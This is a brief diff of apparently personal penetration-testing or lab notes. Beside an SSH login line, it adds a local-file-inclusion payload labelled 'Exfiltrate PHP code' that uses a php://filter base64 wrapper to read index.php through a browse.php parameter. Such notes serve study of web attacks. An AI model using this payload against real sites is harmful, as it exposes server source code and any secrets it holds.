@@ -23,6 +23,7 @@ exit
 # Login to SSH server with no password
 SSH_AUTH_SOCK=0 ssh user@192.168.0.20
 
-
+# Exfiltrate PHP code
+/browse.php?file=php://filter/convert.base64-encode/resource=index.php (check why does this works)
 
 
